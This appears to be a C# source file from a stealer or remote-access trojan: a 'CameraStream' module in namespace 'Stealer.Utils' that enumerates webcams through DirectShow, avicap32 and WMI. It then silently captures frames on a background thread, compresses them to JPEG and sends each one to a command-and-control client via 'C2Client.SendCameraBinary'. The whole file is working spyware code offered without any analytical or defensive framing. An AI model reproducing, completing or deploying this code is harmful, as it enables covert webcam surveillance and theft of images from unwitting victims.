using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace Stealer.Utils
{
    [ComImport, Guid("55272A00-42CB-11CE-8135-00AA004BB851"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    internal interface IPropertyBag
    {
        [PreserveSig]
        int Read([MarshalAs(UnmanagedType.LPWStr)] string pszPropName, ref object pVar, IntPtr pErrorLog);
        [PreserveSig]
        int Write([MarshalAs(UnmanagedType.LPWStr)] string pszPropName, ref object pVar);
    }

    [ComImport, Guid("29840CD1-7D49-11D0-A558-00A0C911CE86"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    internal interface ICreateDevEnum
    {
        [PreserveSig]
        int CreateClassEnumerator([In] ref Guid pType, out IEnumMoniker ppEnumMoniker, [In] int dwFlags);
    }

    [ComImport, Guid("00000102-0000-0000-C000-000000000046"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    internal interface IEnumMoniker
    {
        [PreserveSig]
        int Next([In] int celt, [Out, MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 0)] IMoniker[] rgelt, out int pceltFetched);
        [PreserveSig]
        int Skip([In] int celt);
        [PreserveSig]
        int Reset();
        [PreserveSig]
        int Clone(out IEnumMoniker ppenum);
    }

    [ComImport, Guid("0000010F-0000-0000-C000-000000000046"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    internal interface IMoniker
    {
        void BindToObject(IntPtr pbc, IMoniker pmkToLeft, [In] ref Guid riidResult, [MarshalAs(UnmanagedType.IUnknown)] out object ppvResult);
        void BindToStorage(IntPtr pbc, IMoniker pmkToLeft, [In] ref Guid riid, [MarshalAs(UnmanagedType.IUnknown)] out object ppvResult);
    }

    public static class CameraStream
    {
        private static Thread _captureThread;
        private static volatile bool _running;

        [DllImport("ole32.dll")]
        private static extern int CoInitializeEx(IntPtr pvReserved, int dwCoInit);
        [DllImport("ole32.dll")]
        private static extern void CoUninitialize();

        // DirectShow / capCreateCaptureWindowA via avicap32.dll
        [DllImport("avicap32.dll", EntryPoint = "capCreateCaptureWindowA", CharSet = CharSet.Ansi)]
        private static extern IntPtr capCreateCaptureWindowA(
            string lpszWindowName,
            int dwStyle,
            int x, int y,
            int nWidth, int nHeight,
            IntPtr hWndParent,
            int nID);

        // capGetDriverDescriptionA via avicap32.dll
        [DllImport("avicap32.dll", EntryPoint = "capGetDriverDescriptionA", CharSet = CharSet.Ansi)]
        private static extern bool capGetDriverDescriptionA(
            ushort wDriverIndex,
            [Out] byte[] lpszName,
            int cbName,
            [Out] byte[] lpszVer,
            int cbVer);

        [DllImport("user32.dll")]
        private static extern bool DestroyWindow(IntPtr hWnd);

        [DllImport("user32.dll", EntryPoint = "SendMessageA")]
        private static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern bool OpenClipboard(IntPtr hWndNewOwner);

        [DllImport("user32.dll")]
        private static extern bool EmptyClipboard();

        [DllImport("user32.dll")]
        private static extern IntPtr GetClipboardData(uint uFormat);

        [DllImport("user32.dll")]
        private static extern bool CloseClipboard();

        private const uint WM_CAP_START = 0x0400;
        private const uint WM_CAP_DRIVER_CONNECT = WM_CAP_START + 10;
        private const uint WM_CAP_DRIVER_DISCONNECT = WM_CAP_START + 11;
        private const uint WM_CAP_EDIT_COPY = WM_CAP_START + 30;
        private const uint WM_CAP_GRAB_FRAME = WM_CAP_START + 60;
        private const uint CF_BITMAP = 2;

        private static int _selectedCamIndex = 0;

        public static string GetCameraListJson()
        {
            var list = new System.Collections.Generic.List<string>();

            CoInitializeEx(IntPtr.Zero, 0x2); // COINIT_APARTMENTTHREADED
            try
            {
                Guid category = new Guid("860BB310-5D01-11d0-BD3B-00A0C911CE86"); // CLSID_VideoInputDeviceCategory
                Guid clsidEnum = new Guid("62BE5D10-60EB-11d0-BD3B-00A0C911CE86"); // CLSID_SystemDeviceEnum
                Type typeEnum = Type.GetTypeFromCLSID(clsidEnum);
                if (typeEnum != null)
                {
                    ICreateDevEnum devEnum = (ICreateDevEnum)Activator.CreateInstance(typeEnum);
                    IEnumMoniker enumMoniker;
                    if (devEnum.CreateClassEnumerator(ref category, out enumMoniker, 0) == 0 && enumMoniker != null)
                    {
                        IMoniker[] monikers = new IMoniker[1];
                        int fetched;
                        int index = 0;
                        Guid iidPropertyBag = typeof(IPropertyBag).GUID;

                        while (enumMoniker.Next(1, monikers, out fetched) == 0 && fetched > 0 && monikers[0] != null)
                        {
                            try
                            {
                                object bagObj;
                                monikers[0].BindToStorage(IntPtr.Zero, null, ref iidPropertyBag, out bagObj);
                                IPropertyBag bag = bagObj as IPropertyBag;
                                if (bag != null)
                                {
                                    object val = null;
                                    if (bag.Read("FriendlyName", ref val, IntPtr.Zero) == 0 && val != null)
                                    {
                                        string name = val.ToString().Trim();
                                        if (!string.IsNullOrEmpty(name))
                                        {
                                            name = name.Replace("\\", "\\\\").Replace("\"", "\\\"");
                                            list.Add("{\"id\":" + index + ",\"name\":\"" + name + "\"}");
                                        }
                                    }
                                }
                            }
                            catch { }
                            finally
                            {
                                try { Marshal.ReleaseComObject(monikers[0]); } catch { }
                            }
                            index++;
                        }
                        try { Marshal.ReleaseComObject(enumMoniker); } catch { }
                    }
                }
            }
            catch { }
            finally { CoUninitialize(); }

            // Fallback to avicap32 if DirectShow enumerator had 0 entries
            if (list.Count == 0)
            {
                byte[] nameBuf = new byte[256];
                byte[] verBuf = new byte[256];

                for (ushort i = 0; i < 10; i++)
                {
                    Array.Clear(nameBuf, 0, nameBuf.Length);
                    Array.Clear(verBuf, 0, verBuf.Length);

                    if (capGetDriverDescriptionA(i, nameBuf, nameBuf.Length, verBuf, verBuf.Length))
                    {
                        string name = System.Text.Encoding.ASCII.GetString(nameBuf).TrimEnd('\0', ' ', '\r', '\n');
                        if (!string.IsNullOrEmpty(name))
                        {
                            name = name.Replace("\\", "\\\\").Replace("\"", "\\\"");
                            list.Add("{\"id\":" + i + ",\"name\":\"" + name + "\"}");
                        }
                    }
                }
            }

            // Fallback to WMI if both DirectShow and avicap32 returned 0 items
            if (list.Count == 0)
            {
                try
                {
                    using (var searcher = new System.Management.ManagementObjectSearcher("SELECT * FROM Win32_PnPEntity WHERE PNPClass = 'Camera' OR PNPClass = 'Image' OR Caption LIKE '%Camera%' OR Caption LIKE '%Webcam%'"))
                    {
                        int idx = 0;
                        foreach (var device in searcher.Get())
                        {
                            string caption = device["Caption"]?.ToString();
                            if (!string.IsNullOrEmpty(caption))
                            {
                                caption = caption.Replace("\\", "\\\\").Replace("\"", "\\\"");
                                list.Add("{\"id\":" + idx + ",\"name\":\"" + caption + "\"}");
                                idx++;
                            }
                        }
                    }
                }
                catch { }
            }

            return "[" + string.Join(",", list.ToArray()) + "]";
        }

        public static void Start(int fps, int quality, int camIndex = 0)
        {
            if (_running) Stop();
            _selectedCamIndex = camIndex;
            _running = true;
            _captureThread = new Thread(() => CaptureLoop(fps, quality)) { IsBackground = true };
            _captureThread.Start();
        }

        public static void Stop()
        {
            _running = false;
        }

        private static void CaptureLoop(int fps, int quality)
        {
            int delay = 1000 / Math.Max(fps, 1);
            IntPtr hCap = IntPtr.Zero;

            try
            {
                // Create capture window
                hCap = capCreateCaptureWindowA("CapWindow", 0, 0, 0, 640, 480, IntPtr.Zero, 0);
                if (hCap == IntPtr.Zero)
                {
                    _running = false;
                    return;
                }

                // Connect to chosen camera index
                IntPtr connected = SendMessage(hCap, WM_CAP_DRIVER_CONNECT, (IntPtr)_selectedCamIndex, IntPtr.Zero);
                if (connected == IntPtr.Zero)
                {
                    // Fallback to any active driver 0..9
                    for (int i = 0; i < 10; i++)
                    {
                        if (i == _selectedCamIndex) continue;
                        connected = SendMessage(hCap, WM_CAP_DRIVER_CONNECT, (IntPtr)i, IntPtr.Zero);
                        if (connected != IntPtr.Zero) break;
                    }
                }

                if (connected == IntPtr.Zero)
                {
                    DestroyWindow(hCap);
                    _running = false;
                    return;
                }

                var jpegEncoder = GetJpegEncoder();
                var qualityParam = new EncoderParameters(1);
                qualityParam.Param[0] = new EncoderParameter(Encoder.Quality, (long)Math.Max(10, Math.Min(quality, 100)));

                while (_running)
                {
                    try
                    {
                        // 1. Grab fresh video frame from camera hardware
                        SendMessage(hCap, WM_CAP_GRAB_FRAME, IntPtr.Zero, IntPtr.Zero);
                        // 2. Copy grabbed frame to clipboard bitmap
                        SendMessage(hCap, WM_CAP_EDIT_COPY, IntPtr.Zero, IntPtr.Zero);

                        if (OpenClipboard(IntPtr.Zero))
                        {
                            IntPtr hBitmap = GetClipboardData(CF_BITMAP);
                            if (hBitmap != IntPtr.Zero)
                            {
                                using (Bitmap bmp = Image.FromHbitmap(hBitmap))
                                {
                                    using (MemoryStream ms = new MemoryStream())
                                    {
                                        bmp.Save(ms, jpegEncoder, qualityParam);
                                        byte[] data = ms.ToArray();
                                        if (data != null && data.Length > 0)
                                        {
                                            C2Client.SendCameraBinary(data);
                                        }
                                    }
                                }
                            }
                            CloseClipboard();
                        }
                    }
                    catch { }

                    Thread.Sleep(delay);
                }

                SendMessage(hCap, WM_CAP_DRIVER_DISCONNECT, IntPtr.Zero, IntPtr.Zero);
                DestroyWindow(hCap);
            }
            catch
            {
                if (hCap != IntPtr.Zero) DestroyWindow(hCap);
                _running = false;
            }
        }

        private static ImageCodecInfo GetJpegEncoder()
        {
            foreach (var codec in ImageCodecInfo.GetImageEncoders())
            {
                if (codec.MimeType == "image/jpeg") return codec;
            }
            return null;
        }
    }
}
